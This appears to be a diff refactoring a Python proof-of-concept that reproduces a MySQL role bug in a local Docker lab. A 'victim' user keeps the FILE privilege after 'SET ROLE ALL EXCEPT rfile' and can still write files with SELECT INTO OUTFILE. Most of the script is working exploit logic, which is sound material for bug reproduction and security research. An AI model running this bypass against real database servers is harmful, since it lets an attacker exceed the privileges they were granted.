@@ -228,22 +228,84 @@ _builtins.print = _cprint
 
 import os
 import subprocess
-import sys
+from dataclasses import dataclass
+from pathlib import Path
+from typing import NamedTuple
 
 import pymysql
+from pymysql.cursors import Cursor
 
-WITNESS = "MYSQL-SET-ROLE-LEFTOVER-WITNESS"
 LABEL = "mysql-set-role-leftover"
-COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
-HERE = os.path.dirname(os.path.abspath(__file__))
+WITNESS = "MYSQL-SET-ROLE-LEFTOVER-WITNESS"
 IMAGE_TAG = "mysql:26.7.0"
 HOST = "127.0.0.1"
 PORT = 18630
+DUMP_VERSION = "26.7.0"
+COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
+HERE = Path(__file__).resolve().parent
+
+ROOT_USER = "root"
+ROOT_PASSWORD = "labroot"
+VICTIM_USER = "victim"
+VICTIM_PASSWORD = "victimpass"
+DATABASE = "lab"
+ROLE_RFILE = "rfile"
+
 SECURE_DIR = "/var/lib/mysql-files"
 BEFORE_PATH = f"{SECURE_DIR}/before-role.txt"
 WITH_ROLE_PATH = f"{SECURE_DIR}/with-role.txt"
 LEFTOVER_PATH = f"{SECURE_DIR}/{WITNESS}"
+LEFTOVER_CONST_PATH = f"{SECURE_DIR}/leftover-const.txt"
 AFTER_NONE_PATH = f"{SECURE_DIR}/after-none.txt"
+CONNECT_TIMEOUT = 10
+IO_TIMEOUT = 30
+COMPOSE_TIMEOUT = 60
+
+# ER_TABLEACCESS_DENIED_ERROR: db_acl cache 0 after ALL EXCEPT (Bug#35386565).
+ER_TABLEACCESS_DENIED = 1142
+
+SEED_SQL: tuple[str, ...] = (
+    f"CREATE ROLE {ROLE_RFILE}",
+    f"GRANT FILE ON *.* TO {ROLE_RFILE}",
+    f"CREATE USER '{VICTIM_USER}'@'%' IDENTIFIED BY '{VICTIM_PASSWORD}'",
+    f"GRANT SELECT ON {DATABASE}.* TO '{VICTIM_USER}'@'%'",
+    f"GRANT {ROLE_RFILE} TO '{VICTIM_USER}'@'%'",
+    f"CREATE TABLE {DATABASE}.t (id INT PRIMARY KEY, note VARCHAR(128))",
+    f"INSERT INTO {DATABASE}.t VALUES (1, '{WITNESS}')",
+    "FLUSH PRIVILEGES",
+)
+
+
+@dataclass(frozen=True)
+class Lab:
+    label: str
+    witness: str
+    image: str
+    host: str
+    port: int
+    compose_project: str
+    here: Path
+    dump_version: str
+    secure_dir: str
+
+
+class SqlResult(NamedTuple):
+    ok: bool
+    errno: int | None
+    msg: str
+
+
+LAB = Lab(
+    label=LABEL,
+    witness=WITNESS,
+    image=IMAGE_TAG,
+    host=HOST,
+    port=PORT,
+    compose_project=COMPOSE_PROJECT,
+    here=HERE,
+    dump_version=DUMP_VERSION,
+    secure_dir=SECURE_DIR,
+)
 
 
 def log(msg: str) -> None:
@@ -255,38 +317,53 @@ def fail(reason: str) -> None:
     raise SystemExit(1)
 
 
-def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess:
+def sql_errno(exc: BaseException) -> object:
+    args = getattr(exc, "args", ())
+    return args[0] if args else "?"
+
+
+def compose(
+    *args: str, timeout: int = COMPOSE_TIMEOUT
+) -> subprocess.CompletedProcess[str]:
     return subprocess.run(
-        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
-        cwd=HERE,
+        ["docker", "compose", "-p", LAB.compose_project, *args],
+        cwd=LAB.here,
         text=True,
         capture_output=True,
         timeout=timeout,
     )
 
 
-def connect(user: str, password: str, database: str | None = "lab"):
+def connect(
+    user: str,
+    password: str,
+    database: str | None = DATABASE,
+) -> pymysql.Connection:
     return pymysql.connect(
-        host=HOST,
-        port=PORT,
+        host=LAB.host,
+        port=LAB.port,
         user=user,
         password=password,
         database=database,
         autocommit=True,
         charset="utf8mb4",
-        connect_timeout=10,
-        read_timeout=30,
-        write_timeout=30,
+        connect_timeout=CONNECT_TIMEOUT,
+        read_timeout=IO_TIMEOUT,
+        write_timeout=IO_TIMEOUT,
     )
 
 
-def fetch_one(cur, sql: str):
+def fetch_one(cur: Cursor, sql: str) -> object | None:
     cur.execute(sql)
     row = cur.fetchone()
     return None if row is None else row[0]
 
 
-def norm_role(val) -> str:
+def current_role(cur: Cursor) -> str:
+    return norm_role(fetch_one(cur, "SELECT CURRENT_ROLE()"))
+
+
+def norm_role(val: object | None) -> str:
     if val is None:
         return "NONE"
     text = str(val).strip()
@@ -297,41 +374,109 @@ def norm_role(val) -> str:
 
 
 def role_has_rfile(val: str) -> bool:
-    return "rfile" in val.replace("`", "").lower()
+    return ROLE_RFILE in val.replace("`", "").lower()
 
 
-def run_outfile(cur, sql: str) -> tuple[bool, int | None, str]:
+def run_sql(cur: Cursor, sql: str) -> SqlResult:
     try:
         cur.execute(sql)
-        return True, None, "ok"
+        return SqlResult(True, None, "ok")
     except pymysql.Error as exc:
         errno = exc.args[0] if exc.args else None
         msg = exc.args[1] if len(exc.args) > 1 else str(exc)
-        return False, errno, str(msg)
+        return SqlResult(False, errno, str(msg))
 
 
-def outfile_attempt(cur, path: str) -> tuple[bool, int | None, str]:
-    return run_outfile(cur, f"SELECT note FROM lab.t INTO OUTFILE '{path}'")
+def outfile_attempt(cur: Cursor, path: str) -> SqlResult:
+    return run_sql(cur, f"SELECT note FROM {DATABASE}.t INTO OUTFILE '{path}'")
 
 
-def outfile_attempt_const(cur, path: str) -> tuple[bool, int | None, str]:
-    return run_outfile(cur, f"SELECT '{WITNESS}' INTO OUTFILE '{path}'")
+def outfile_attempt_const(cur: Cursor, path: str) -> SqlResult:
+    return run_sql(cur, f"SELECT '{WITNESS}' INTO OUTFILE '{path}'")
 
 
 def read_container_file(path: str) -> tuple[int, str, str]:
-    proc = compose("exec", "-T", "mysql", "cat", path, timeout=30)
-    out = proc.stdout or ""
-    err = proc.stderr or ""
-    return proc.returncode, out, err
+    proc = compose("exec", "-T", "mysql", "cat", path, timeout=IO_TIMEOUT)
+    return proc.returncode, proc.stdout or "", proc.stderr or ""
+
+
+def seed_victim(cur: Cursor) -> None:
+    for stmt in SEED_SQL:
+        try:
+            cur.execute(stmt)
+            log(f"seed-ok {stmt}")
+        except pymysql.Error as exc:
+            fail(f"seed-failed stmt={stmt!r} errno={sql_errno(exc)} {exc}")
+
+
+def deactivate_except_rfile(cur: Cursor) -> str:
+    cur.execute(f"SET ROLE ALL EXCEPT {ROLE_RFILE}")
+    role = current_role(cur)
+    log(f"step7 CURRENT_ROLE after ALL EXCEPT {ROLE_RFILE}={role}")
+    if role != "NONE":
+        log(f"except-host-retry SET ROLE ALL EXCEPT `{ROLE_RFILE}`@`%`")
+        cur.execute(f"SET ROLE ALL EXCEPT `{ROLE_RFILE}`@`%`")
+        role = current_role(cur)
+        log(f"step7-retry CURRENT_ROLE={role}")
+    if role != "NONE":
+        fail(f"leftover-role={role} expected=NONE")
+    return role
+
+
+def prove_leftover_file(cur: Cursor, leftover_role: str) -> SqlResult:
+    leftover = outfile_attempt(cur, LEFTOVER_PATH)
+    log(
+        f"step8 leftover outfile ok={leftover.ok} errno={leftover.errno} "
+        f"msg={leftover.msg!r}"
+    )
+    if leftover.ok or leftover.errno != ER_TABLEACCESS_DENIED:
+        if not leftover.ok:
+            fail(
+                f"leftover-file=denied errno={leftover.errno} "
+                f"leftover-role={leftover_role}"
+            )
+        return leftover
+
+    # Table SELECT INTO OUTFILE hits 1142 until USE lab reloads db_acl.
+    # Constant SELECT witness INTO OUTFILE is the leftover FILE oracle.
+    log("step8 db-acl-cache-zeroed; USE lab to reload user DB grants")
+    try:
+        sel_ok = True
+        cur.execute(f"SELECT note FROM {DATABASE}.t")
+        log(f"step8 select-before-use row={cur.fetchone()!r}")
+    except pymysql.Error as exc:
+        sel_ok = False
+        log(
+            f"step8 select-before-use denied errno="
+            f"{exc.args[0] if exc.args else None} {exc}"
+        )
+    const = outfile_attempt_const(cur, LEFTOVER_CONST_PATH)
+    log(
+        f"step8 leftover-const-outfile ok={const.ok} errno={const.errno} "
+        f"msg={const.msg!r}"
+    )
+    cur.execute(f"USE {DATABASE}")
+    log("step8 USE lab")
+    leftover = outfile_attempt(cur, LEFTOVER_PATH)
+    log(
+        f"step8 leftover outfile after USE lab ok={leftover.ok} "
+        f"errno={leftover.errno} msg={leftover.msg!r} select-before-use={sel_ok}"
+    )
+    if not leftover.ok:
+        fail(
+            f"leftover-file=denied errno={leftover.errno} "
+            f"leftover-role={leftover_role}"
+        )
+    return leftover
 
 
 def main() -> None:
     log(f"lab={LABEL} image={IMAGE_TAG} host={HOST} port={PORT}")
 
     try:
-        root = connect("root", "labroot")
+        root = connect(ROOT_USER, ROOT_PASSWORD)
     except pymysql.Error as exc:
-        fail(f"root-connect-failed errno={exc.args[0] if exc.args else '?'} {exc}")
+        fail(f"root-connect-failed errno={sql_errno(exc)} {exc}")
 
     with root:
         rcur = root.cursor()
@@ -341,39 +486,24 @@ def main() -> None:
         log(f"mysqld-version={version!r}")
         log(f"activate_all_roles_on_login={activate!r}")
         log(f"secure_file_priv={secure!r}")
-        if "26.7.0" not in version:
+        if DUMP_VERSION not in version:
             fail(f"version-mismatch version={version!r} image={IMAGE_TAG}")
-        if str(secure or "").rstrip("/") != SECURE_DIR:
+        if str(secure or "").rstrip("/") != LAB.secure_dir:
             fail(f"secure-file-priv-mismatch value={secure!r}")
 
-        seed = [
-            "CREATE ROLE rfile",
-            "GRANT FILE ON *.* TO rfile",
-            "CREATE USER 'victim'@'%' IDENTIFIED BY 'victimpass'",
-            "GRANT SELECT ON lab.* TO 'victim'@'%'",
-            "GRANT rfile TO 'victim'@'%'",
-            "CREATE TABLE lab.t (id INT PRIMARY KEY, note VARCHAR(128))",
-            f"INSERT INTO lab.t VALUES (1, '{WITNESS}')",
-            "FLUSH PRIVILEGES",
-        ]
-        for stmt in seed:
-            try:
-                rcur.execute(stmt)
-                log(f"seed-ok {stmt}")
-            except pymysql.Error as exc:
-                fail(f"seed-failed stmt={stmt!r} errno={exc.args[0] if exc.args else '?'} {exc}")
-
+        seed_victim(rcur)
         grants = fetch_one(
             rcur,
-            "SELECT IFNULL(file_priv,'?') FROM mysql.user WHERE user='victim' AND host='%'",
+            "SELECT IFNULL(file_priv,'?') FROM mysql.user "
+            f"WHERE user='{VICTIM_USER}' AND host='%'",
         )
         log(f"victim-direct-file_priv={grants!r}")
         rcur.close()
 
     try:
-        victim = connect("victim", "victimpass")
+        victim = connect(VICTIM_USER, VICTIM_PASSWORD)
     except pymysql.Error as exc:
-        fail(f"victim-connect-failed errno={exc.args[0] if exc.args else '?'} {exc}")
+        fail(f"victim-connect-failed errno={sql_errno(exc)} {exc}")
 
     with victim:
         vcur = victim.cursor()
@@ -381,80 +511,47 @@ def main() -> None:
         session_user = fetch_one(vcur, "SELECT USER()")
         log(f"victim-current-user={current_user!r} session-user={session_user!r}")
 
-        role0 = norm_role(fetch_one(vcur, "SELECT CURRENT_ROLE()"))
+        role0 = current_role(vcur)
         log(f"step1 CURRENT_ROLE={role0}")
         if role0 != "NONE":
             fail(f"login-role-not-none role={role0}")
 
-        before_ok, before_errno, before_msg = outfile_attempt(vcur, BEFORE_PATH)
-        log(f"step2 before-role outfile ok={before_ok} errno={before_errno} msg={before_msg!r}")
-        if before_ok:
+        before = outfile_attempt(vcur, BEFORE_PATH)
+        log(
+            f"step2 before-role outfile ok={before.ok} errno={before.errno} "
+            f"msg={before.msg!r}"
+        )
+        # Login FILE deny is ER_SPECIFIC_ACCESS_DENIED_ERROR (1227).
+        if before.ok:
             fail("before-file=allowed expected-denied")
 
-        vcur.execute("SET ROLE rfile")
-        role1 = norm_role(fetch_one(vcur, "SELECT CURRENT_ROLE()"))
+        vcur.execute(f"SET ROLE {ROLE_RFILE}")
+        role1 = current_role(vcur)
         log(f"step4 CURRENT_ROLE={role1}")
         if not role_has_rfile(role1):
             fail(f"set-role-rfile-failed role={role1}")
 
-        with_ok, with_errno, with_msg = outfile_attempt(vcur, WITH_ROLE_PATH)
-        log(f"step5 with-role outfile ok={with_ok} errno={with_errno} msg={with_msg!r}")
-        if not with_ok:
-            fail(f"with-role=denied errno={with_errno}")
-
-        vcur.execute("SET ROLE ALL EXCEPT rfile")
-        role2 = norm_role(fetch_one(vcur, "SELECT CURRENT_ROLE()"))
-        log(f"step7 CURRENT_ROLE after ALL EXCEPT rfile={role2}")
-        if role2 != "NONE":
-            log("except-host-retry SET ROLE ALL EXCEPT `rfile`@`%`")
-            vcur.execute("SET ROLE ALL EXCEPT `rfile`@`%`")
-            role2 = norm_role(fetch_one(vcur, "SELECT CURRENT_ROLE()"))
-            log(f"step7-retry CURRENT_ROLE={role2}")
-        if role2 != "NONE":
-            fail(f"leftover-role={role2} expected=NONE")
-
-        leftover_ok, leftover_errno, leftover_msg = outfile_attempt(vcur, LEFTOVER_PATH)
+        with_role = outfile_attempt(vcur, WITH_ROLE_PATH)
         log(
-            f"step8 leftover outfile ok={leftover_ok} errno={leftover_errno} msg={leftover_msg!r}"
+            f"step5 with-role outfile ok={with_role.ok} errno={with_role.errno} "
+            f"msg={with_role.msg!r}"
         )
-        if not leftover_ok and leftover_errno == 1142:
-            # ALL EXCEPT caches db_acl()==0 (Bug#35386565 path). Direct lab.*
-            # SELECT is dropped from the session cache; FILE stays in
-            # m_master_access. USE lab reloads user DB grants via acl_get.
-            log("step8 db-acl-cache-zeroed; USE lab to reload user DB grants")
-            try:
-                sel_ok = True
-                vcur.execute("SELECT note FROM lab.t")
-                log(f"step8 select-before-use row={vcur.fetchone()!r}")
-            except pymysql.Error as exc:
-                sel_ok = False
-                log(
-                    f"step8 select-before-use denied errno={exc.args[0] if exc.args else None} {exc}"
-                )
-            const_path = f"{SECURE_DIR}/leftover-const.txt"
-            const_ok, const_errno, const_msg = outfile_attempt_const(vcur, const_path)
-            log(
-                f"step8 leftover-const-outfile ok={const_ok} errno={const_errno} msg={const_msg!r}"
-            )
-            vcur.execute("USE lab")
-            log("step8 USE lab")
-            leftover_ok, leftover_errno, leftover_msg = outfile_attempt(
-                vcur, LEFTOVER_PATH
-            )
-            log(
-                f"step8 leftover outfile after USE lab ok={leftover_ok} "
-                f"errno={leftover_errno} msg={leftover_msg!r} select-before-use={sel_ok}"
-            )
-        if not leftover_ok:
-            fail(f"leftover-file=denied errno={leftover_errno} leftover-role={role2}")
+        if not with_role.ok:
+            fail(f"with-role=denied errno={with_role.errno}")
+
+        role2 = deactivate_except_rfile(vcur)
+        prove_leftover_file(vcur, role2)
 
         vcur.execute("SET ROLE NONE")
-        role3 = norm_role(fetch_one(vcur, "SELECT CURRENT_ROLE()"))
+        role3 = current_role(vcur)
         log(f"step9 CURRENT_ROLE after NONE={role3}")
 
-        after_ok, after_errno, after_msg = outfile_attempt(vcur, AFTER_NONE_PATH)
-        log(f"step10 after-none outfile ok={after_ok} errno={after_errno} msg={after_msg!r}")
-        if after_ok:
+        after = outfile_attempt(vcur, AFTER_NONE_PATH)
+        log(
+            f"step10 after-none outfile ok={after.ok} errno={after.errno} "
+            f"msg={after.msg!r}"
+        )
+        if after.ok:
             fail("after-none=allowed expected-denied")
 
         vcur.close()
@@ -466,10 +563,10 @@ def main() -> None:
     if WITNESS not in cat_out:
         fail(f"leftover-file-missing-witness contents={cat_out!r}")
 
-    dump_ver = "26.7.0"
     log(
         f"SUCCESS {LABEL} before-file=denied with-role=yes leftover-role=NONE "
-        f"leftover-file=yes after-none=denied dump={dump_ver} image={IMAGE_TAG} {WITNESS}"
+        f"leftover-file=yes after-none=denied dump={DUMP_VERSION} "
+        f"image={IMAGE_TAG} {WITNESS}"
     )
 
 
@@ -480,5 +577,4 @@ if __name__ == "__main__":
         raise
     except Exception as exc:
         fail(f"exception={type(exc).__name__}:{exc}")
-        sys.exit(1)
 
